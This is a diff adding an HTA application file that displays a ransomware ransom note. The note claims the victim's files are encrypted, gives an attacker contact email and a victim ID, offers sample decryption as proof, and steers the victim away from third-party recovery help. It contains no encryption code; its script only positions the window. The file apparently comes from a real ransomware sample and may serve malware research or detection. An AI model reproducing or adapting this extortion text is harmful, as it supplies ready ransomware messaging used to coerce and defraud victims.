@@ -1,0 +1,117 @@
+<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01//EN' 'http://www.w3.org/TR/html4/strict.dtd'>
+<html>
+  <head>
+    <meta charset='windows-1251'>
+    <title>encrypted</title>
+
+    <HTA:APPLICATION
+      ICON='msiexec.exe'
+      SINGLEINSTANCE='yes'
+      SysMenu="no">
+
+    <script language='JScript'>
+      window.moveTo(50, 50);
+      window.resizeTo(screen.width - 100, screen.height - 100);
+    </script>
+
+    <style type='text/css'>
+
+      body {
+        font: 15px Tahoma, sans-serif;
+        margin: 10px;
+        line-height: 25px;
+        background: #80d594;
+      }
+
+      .bold {
+        font-weight: bold;
+      }
+
+      .mark {
+        background: #338a43;
+        padding: 2px 5px;
+      }
+
+	  img {
+		display:block;
+		margin:auto;
+	  }
+      .header {
+		text-align: center;
+        font-size: 30px;
+        line-height: 50px;
+        font-weight: bold;
+		margin-bottom:20px;
+      }
+
+	  
+      .info {
+        background: #D0D0E8;
+        border-left: 10px solid #00008B;
+      }
+      .alert {
+        background: #fea702;
+        border-left: 10px solid  #ff4308;
+      }
+      .private {
+        border: 1px dashed #000;
+        background: #FFFFEF;
+      }
+.separator {
+  background: #D0D0E8;
+        border-left: 10px solid #D0D0E8;
+}
+      .note {
+        height: auto;
+        padding-bottom: 1px;
+        margin: 15px 0;
+      }
+      .note .title {
+        font-weight: bold;
+        text-indent: 10px;
+        height: 30px;
+        line-height: 30px;
+        padding-top: 10px;
+      }
+      .note .mark {
+        background: #A2A2B5;
+      }
+      .note ul {
+        margin-top: 0;
+      }
+      .note pre {
+        margin-left: 15px;
+        line-height: 13px;
+        font-size: 13px;
+      }
+
+    </style>
+  </head>
+
+  <body>
+    <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAQAAAAAYLlVAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAAAAmJLR0QA/4ePzL8AAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfjAwwMJwSFwIn8AAADNklEQVRo3u2ZTUhUURTHfzozmprmZ1pYEmkfJNEmiwwkSEyFECIQpEUboYhqFYHQXlcti9rUKldWBEUiuQpbtDDNzD5G8qM0HRXLRtO5LdJx3puPd++8+xyIztm88zgf/3veufeee18SdimDI1RxnL0U4gbAzxhDdPGCfpZs+49JWTTyFB8iAq8wTju1pDgXvopOliIGX+d57rHPieBuLvLNIvgaD1KvP/x1FiTDCwQTNOkFcJVfCuEFgq+c0he+minF8AJBH2WRnCUph8/nIZVhb2d5w1smEbjYSTn7SQ/TucsFlnWkPxBW6Xc4RkbIoHKooSNshsxRbT98Eb0mtyM04oqgmR6hUNvtrwrnWDa4nOVMVF0XLfw2aPuosBfezQPTmNpiVtFmnpj0W+wBKMFrcPeJ3RYWNfwwWHSSZgdAHX6Du5uWFpl0myqm1KiQrASgnNQQaZFOS4t5nhvkAnbZAbDHIE0wIGHzmsUQKdXkQwlACtsN8ijfJay8zBjkovgBbCLPlAG/hNUcswa5IH4Ayasdzxr5pBbWRRYMstGHYg04QAkH4FbQFSwTCKbdI7mzWVipbMceKtiCCFqO0OeY1caRbAaKOcgOCpQ+WWTyM8EwvfjkTfJoYZDFONqwaPyTHs7LbktlPNMYep2XuE22dfhsHjkS/i+3Wn/SK2EdoE72UeuyGH8rxbbLLjqlkRlb4TAzDo5fIJiOvRTnR+ju9VJuwveC/wASDsD+2h5KUyyQTVZiALzjFt3MsY16mtmqx2mt9BbUw4EQuzpGpVcCLQB8nDBZXmJFDoCeInzFS9ObxwzLmeoBMGA4/QBM4t1IAOHXDi7Zqwg9ACrCWotS8xnQWQCHOGsafzOFOhzLT8NxmoI3RZncULjG1ARA8DHYupxUucbUtxd4ghnw4JI30wdARHneMABx0j8FYD3xCkdefQByKFl9KsOjy6nKNBR0cZRCTjOk1JhrBCCY5r3pZtSS9bZkueSqmljVgPoPDa0Algk4HD8QG8AXph0G8Dk2AC89DgPosFKodvR83G/dtiRzTevtUChP0SCTpBQuM+bI6Bvk51gl96X/FFvzCh9oW0v+H2zO2tYtz/EgAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTAzLTEyVDEyOjM5OjA0KzAwOjAwG6lIYwAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wMy0xMlQxMjozOTowNCswMDowMGr08N8AAAAASUVORK5CYII='/>
+    <div class='header'>
+
+		<div>ALL YOUR FILES ARE ENCRYPTED* BUT NOT DELETED</div>
+  </div>
+
+  <div class='bold'>Your computer is infected with a virus.</div>	
+	 <div class='bold'>Files are encrypted* but not deleted.</div>
+   <div class='bold'>Send an email <span class="mark">neftet@tutanota.com</span>, specify in the subject unique identifier <span class="mark">7AF6F6E7-5499</span> and you will definitly be helped to recover.</div>
+   <div class="bold">*you can send us a couple of files and we will return the restored ones to prove that only we can do it</div> 
+ 
+	
+
+    <div class='note alert'>
+      <div class='title'>IMPORTANT:</div>
+      <ul>
+        <a>1. the infection was due to vulnerabilities in your software.<br></a>
+        <a>2. if you want to make sure that it is impossible to recover files using third-party software, do this not on all files, otherwise you may lose all data.<br></a>
+        <a>3. only communication through our email can guarantee file recover for you. We are not responsible for the actions of third parties who promise to help you - most often they are scammers.<br></a>
+        
+        <a>4. please, do not try to rename encrypted files.<br></a>
+        <a>5. our goal is to return your data, but if you don't contact us, we will not succeed.<br></a>
+      </ul>
+    </div>
+  </body>
+</html>
